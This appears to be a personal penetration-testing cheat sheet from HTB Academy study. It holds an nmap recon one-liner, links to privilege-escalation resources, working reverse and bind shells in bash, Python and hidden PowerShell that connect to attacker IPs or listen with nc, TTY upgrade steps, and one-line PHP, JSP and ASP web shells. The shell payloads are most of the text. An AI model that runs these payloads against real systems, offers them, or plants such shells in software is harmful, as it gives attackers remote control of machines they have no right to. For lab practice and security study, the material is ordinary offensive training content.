# HTB ACADEMY Learning Personal Repo

## Recon

```bash
TARGET=;mkdir nmap;sudo nmap -vvv -A -sV -sC --min-rate=5000 $TARGET -p`sudo nmap -T5 -Pn --min-rate=5000 $TARGET -p- | grep 'open' | cut -d '/' -f1 | tr "\n" "," | sed s/,$//g` -oA nmap/$TARGET && xsltproc nmap/$TARGET.xml -o nmap/$TARGET.html
``` 

## PrivEsc


### Linux_Checklists

> [Checklist 1](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)  
> [Checklist 2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  

### Windows_Checklists

> [Checklist 1](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)  
> [Checklist 2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  

### List Of Commands for PrivEsc
> [GTFOBins (Linux)](https://gtfobins.github.io/)  
> [LOLBAS (Windows)](https://gtfobins.github.io/)  

## Backdoor shells


### Reverse Shells

> [Villian (For Windows & Linux)](https://github.com/t3l3machus/Villain)

> Bash Shell
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

> Python Shell

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
> Windows Powershell 

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Bind Shells

> Bash Shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```


> Python Shell

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

> Windows Powershell

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

```

### Upgrading TTY

+ We will first run below command:
```python
python -c 'import pty;pty.spawn("/bin/bash")'
```
+ After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:
```bash
stty raw -echo;fg
#press 'Enter to continue'
```

+ Fix shell size:

```bash
export TERM=$TERM
stty row 38 columns 169 
```

### Web Shell


> Php Web Shell

```php
<?php system($_REQUEST['cmd']); ?>
```

> Jsp Web Shell

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

> Asp Web Shell

```asp
<% eval request("cmd") %>
```

## References URLs

> [GTFObins](https://gtfobins.github.io)
>
> [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)  
>
> [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)  
>
> [HackTricks](https://book.hacktricks.xyz/welcome/readme)  
>
> [Ippsec (YouTube)](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)  
>
> [Ippsec (Topic Searcher)](https://ippsec.rocks/?#)  
>
> [VbScrub (YouTube)](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ)  
>
> [STÖK (YouTube)](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg)  
>
> [LiveOverflow (YouTube)](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)  
>
> [0xdf hacks stuff(Blog)](https://0xdf.gitlab.io/)  
>
> [Under The Wire (Powershell Tutorial Website)](https://underthewire.tech/)
>
> [Over The Wire (Bash Tutorial Website)](https://overthewire.org/wargames/)
>
> [Magic Unicorn Downgrade Tool (For Windows)](https://github.com/trustedsec/unicorn)
